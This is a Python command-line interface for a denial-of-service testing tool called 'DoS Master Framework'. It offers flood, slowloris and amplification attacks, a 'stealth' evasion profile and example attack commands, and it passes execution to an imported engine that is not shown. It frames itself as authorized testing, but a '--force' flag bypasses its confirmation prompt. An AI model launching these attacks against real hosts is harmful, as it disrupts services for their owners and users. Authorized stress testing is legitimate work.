#!/usr/bin/env python3
"""
DoS Master Framework - Command Line Interface
Professional DoS Testing Framework for Authorized Testing Only

Author: Tech Sky
License: MIT
"""

import argparse
import sys
import os
import yaml
import signal
from datetime import datetime
from pathlib import Path

# Add src to path
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from core.engine import DoSEngine
from core.monitor import Monitor
from core.analyzer import TrafficAnalyzer
from core.reporter import ReportGenerator
from utils.validation import validate_target, validate_attack_params
from utils.logger import setup_logger
from utils.config import load_config

class DoSMasterCLI:
    def __init__(self):
        self.engine = None
        self.monitor = None
        self.analyzer = None
        self.reporter = None
        self.logger = setup_logger()
        self.config = load_config()
        
    def display_banner(self):
        """Display framework banner"""
        banner = """
╔══════════════════════════════════════════════════════════════════╗
║                    DoS Master Framework v2.0                    ║
║              Professional DoS Testing Framework                  ║
║                                                                  ║
║  ⚠️  FOR AUTHORIZED TESTING ONLY - EDUCATIONAL PURPOSES  ⚠️      ║
║                                                                  ║
║  Unauthorized use is illegal and punishable by law              ║
║  Use only on systems you own or have written permission         ║
╚══════════════════════════════════════════════════════════════════╝

Author: Tech Sky | License: MIT | GitHub: TechSky/dos-master-framework
"""
        print(banner)
        
    def setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        def signal_handler(signum, frame):
            print(f"\n[!] Received signal {signum}, stopping attacks...")
            if self.engine:
                self.engine.stop_all_attacks()
            sys.exit(0)
            
        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)
    
    def create_parser(self):
        """Create command line argument parser"""
        parser = argparse.ArgumentParser(
            description="DoS Master Framework - Professional DoS Testing Tool",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Examples:
  # Simple ICMP flood
  dmf --target 192.168.1.100 --attack icmp_flood --duration 60
  
  # SYN flood with custom parameters
  dmf --target 192.168.1.100 --attack syn_flood --port 80 --threads 10 --duration 120
  
  # HTTP flood with monitoring
  dmf --target http://192.168.1.100 --attack http_flood --monitor --duration 300
  
  # Multi-vector attack
  dmf --target 192.168.1.100 --attack multi_vector --config custom_attack.yaml
  
  # List available attacks
  dmf --list-attacks
  
  # Start web interface
  dmf --web-ui --port 8080
            """
        )
        
        # Target specification
        parser.add_argument('--target', '-t', required=False,
                          help='Target IP address or URL')
        
        # Attack specification
        parser.add_argument('--attack', '-a', 
                          choices=['icmp_flood', 'udp_flood', 'syn_flood', 
                                 'http_flood', 'slowloris', 'amplification', 
                                 'multi_vector', 'custom'],
                          help='Attack type to perform')
        
        # Attack parameters
        parser.add_argument('--port', '-p', type=int, default=80,
                          help='Target port (default: 80)')
        
        parser.add_argument('--threads', type=int, default=10,
                          help='Number of attack threads (default: 10)')
        
        parser.add_argument('--duration', '-d', type=int, default=60,
                          help='Attack duration in seconds (default: 60)')
        
        parser.add_argument('--rate', type=int, default=0,
                          help='Packet rate limit (0 = no limit)')
        
        parser.add_argument('--payload-size', type=int, default=1024,
                          help='Payload size in bytes (default: 1024)')
        
        # Configuration
        parser.add_argument('--config', '-c',
                          help='Custom configuration file')
        
        parser.add_argument('--profile',
                          choices=['stealth', 'moderate', 'aggressive'],
                          default='moderate',
                          help='Attack profile (default: moderate)')
        
        # Monitoring and analysis
        parser.add_argument('--monitor', '-m', action='store_true',
                          help='Enable real-time monitoring')
        
        parser.add_argument('--analyze', action='store_true',
                          help='Perform traffic analysis')
        
        parser.add_argument('--capture-file', 
                          help='Save packet capture to file')
        
        parser.add_argument('--report', action='store_true',
                          help='Generate detailed report')
        
        parser.add_argument('--output-dir', default='./reports',
                          help='Output directory for reports (default: ./reports)')
        
        # Information
        parser.add_argument('--list-attacks', action='store_true',
                          help='List available attack types')
        
        parser.add_argument('--list-profiles', action='store_true',
                          help='List available attack profiles')
        
        parser.add_argument('--version', action='version', version='DoS Master Framework 2.0')
        
        # Web interface
        parser.add_argument('--web-ui', action='store_true',
                          help='Start web interface')
        
        parser.add_argument('--web-port', type=int, default=8080,
                          help='Web interface port (default: 8080)')
        
        # Validation and safety
        parser.add_argument('--validate-only', action='store_true',
                          help='Validate configuration without running attack')
        
        parser.add_argument('--dry-run', action='store_true',
                          help='Simulate attack without sending packets')
        
        parser.add_argument('--force', action='store_true',
                          help='Skip safety confirmations (use with caution)')
        
        # Verbosity
        parser.add_argument('--verbose', '-v', action='count', default=0,
                          help='Increase verbosity (-v, -vv, -vvv)')
        
        parser.add_argument('--quiet', '-q', action='store_true',
                          help='Suppress non-error output')
        
        return parser
    
    def validate_environment(self):
        """Validate execution environment"""
        # Check if running as root
        if os.geteuid() != 0:
            print("[!] Warning: Some attacks require root privileges")
            print("    Consider running with sudo for full functionality")
        
        # Check required tools
        required_tools = ['hping3', 'nmap', 'tcpdump']
        missing_tools = []
        
        for tool in required_tools:
            if os.system(f"which {tool} > /dev/null 2>&1") != 0:
                missing_tools.append(tool)
        
        if missing_tools:
            print(f"[!] Missing required tools: {', '.join(missing_tools)}")
            print("    Install with: sudo apt install " + " ".join(missing_tools))
            return False
        
        return True
    
    def list_attacks(self):
        """List available attack types"""
        attacks = {
            'icmp_flood': 'ICMP flood attack (ping flood)',
            'udp_flood': 'UDP flood attack (connectionless flooding)',
            'syn_flood': 'TCP SYN flood attack (connection exhaustion)',
            'http_flood': 'HTTP flood attack (application layer)',
            'slowloris': 'Slowloris attack (connection holding)',
            'amplification': 'DNS/NTP/SNMP amplification attacks',
            'multi_vector': 'Combined multi-vector attack',
            'custom': 'Custom attack from configuration file'
        }
        
        print("\nAvailable Attack Types:")
        print("=" * 50)
        for attack, description in attacks.items():
            print(f"  {attack:<15} - {description}")
        print()
    
    def list_profiles(self):
        """List available attack profiles"""
        profiles = {
            'stealth': 'Low rate, evasive attacks for detection testing',
            'moderate': 'Balanced attacks for general testing',
            'aggressive': 'High-intensity attacks for stress testing'
        }
        
        print("\nAvailable Attack Profiles:")
        print("=" * 50)
        for profile, description in profiles.items():
            print(f"  {profile:<12} - {description}")
        print()
    
    def confirm_attack(self, args):
        """Confirm attack parameters with user"""
        if args.force:
            return True
            
        print(f"\n[!] ATTACK CONFIRMATION")
        print(f"    Target: {args.target}")
        print(f"    Attack: {args.attack}")
        print(f"    Duration: {args.duration} seconds")
        print(f"    Threads: {args.threads}")
        print(f"    Profile: {args.profile}")
        print()
        print("⚠️  WARNING: This will launch a DoS attack against the specified target.")
        print("    Ensure you have proper authorization before proceeding.")
        print()
        
        while True:
            response = input("Do you want to continue? [y/N]: ").strip().lower()
            if response in ['y', 'yes']:
                return True
            elif response in ['n', 'no', '']:
                return False
            else:
                print("Please enter 'y' or 'n'")
    
    def run_attack(self, args):
        """Execute the specified attack"""
        try:
            # Initialize components
            self.engine = DoSEngine(self.config, self.logger)
            
            if args.monitor:
                self.monitor = Monitor(args.target, self.logger)
                self.monitor.start()
            
            if args.analyze or args.capture_file:
                self.analyzer = TrafficAnalyzer(self.logger)
                if args.capture_file:
                    self.analyzer.start_capture(args.capture_file)
            
            # Configure attack parameters
            attack_config = {
                'target': args.target,
                'port': args.port,
                'threads': args.threads,
                'duration': args.duration,
                'rate': args.rate,
                'payload_size': args.payload_size,
                'profile': args.profile,
                'dry_run': args.dry_run
            }
            
            # Load custom config if specified
            if args.config:
                with open(args.config, 'r') as f:
                    custom_config = yaml.safe_load(f)
                    attack_config.update(custom_config)
            
            print(f"\n[+] Starting {args.attack} attack against {args.target}")
            print(f"    Duration: {args.duration} seconds")
            print(f"    Threads: {args.threads}")
            print(f"    Profile: {args.profile}")
            
            if args.dry_run:
                print("    Mode: DRY RUN (no packets will be sent)")
            
            print("\n" + "=" * 60)
            
            # Execute attack
            result = self.engine.execute_attack(args.attack, attack_config)
            
            print("\n" + "=" * 60)
            print(f"[+] Attack completed")
            print(f"    Packets sent: {result.get('packets_sent', 'N/A')}")
            print(f"    Success rate: {result.get('success_rate', 'N/A')}%")
            print(f"    Average rate: {result.get('avg_rate', 'N/A')} pps")
            
            # Generate report if requested
            if args.report:
                self.reporter = ReportGenerator(self.logger)
                report_file = self.reporter.generate_report(result, args.output_dir)
                print(f"    Report saved: {report_file}")
            
            return result
            
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n[!] Attack failed: {e}")
            self.logger.error(f"Attack execution failed: {e}")
        finally:
            # Cleanup
            if self.engine:
                self.engine.cleanup()
            if self.monitor:
                self.monitor.stop()
            if self.analyzer:
                self.analyzer.stop()
    
    def start_web_ui(self, port):
        """Start web interface"""
        try:
            from ui.web import create_app
            app = create_app(self.config)
            print(f"\n[+] Starting web interface on port {port}")
            print(f"    Access at: http://localhost:{port}")
            print("    Press Ctrl+C to stop")
            app.run(host='0.0.0.0', port=port, debug=False)
        except ImportError:
            print("[!] Web interface dependencies not installed")
            print("    Install with: pip install flask flask-socketio")
        except Exception as e:
            print(f"[!] Failed to start web interface: {e}")
    
    def main(self):
        """Main entry point"""
        self.setup_signal_handlers()
        
        parser = self.create_parser()
        args = parser.parse_args()
        
        # Handle verbosity
        if args.quiet:
            self.logger.setLevel(40)  # ERROR
        elif args.verbose >= 3:
            self.logger.setLevel(10)  # DEBUG
        elif args.verbose >= 1:
            self.logger.setLevel(20)  # INFO
        
        # Display banner unless quiet
        if not args.quiet:
            self.display_banner()
        
        # Validate environment
        if not self.validate_environment():
            sys.exit(1)
        
        # Handle information requests
        if args.list_attacks:
            self.list_attacks()
            return
        
        if args.list_profiles:
            self.list_profiles()
            return
        
        # Handle web UI
        if args.web_ui:
            self.start_web_ui(args.web_port)
            return
        
        # Validate required arguments for attacks
        if not args.target and not args.web_ui:
            print("[!] Target is required for attack operations")
            parser.print_help()
            sys.exit(1)
        
        if not args.attack and not args.web_ui:
            print("[!] Attack type is required")
            parser.print_help()
            sys.exit(1)
        
        # Validate target
        if args.target:
            if not validate_target(args.target):
                print(f"[!] Invalid target: {args.target}")
                sys.exit(1)
        
        # Validate attack parameters
        if not validate_attack_params(args):
            print("[!] Invalid attack parameters")
            sys.exit(1)
        
        # Validation only mode
        if args.validate_only:
            print("[+] Configuration validation passed")
            return
        
        # Confirm attack
        if not self.confirm_attack(args):
            print("[!] Attack cancelled by user")
            return
        
        # Execute attack
        self.run_attack(args)

def main():
    """Entry point for dmf command"""
    cli = DoSMasterCLI()
    cli.main()

if __name__ == '__main__':
    main()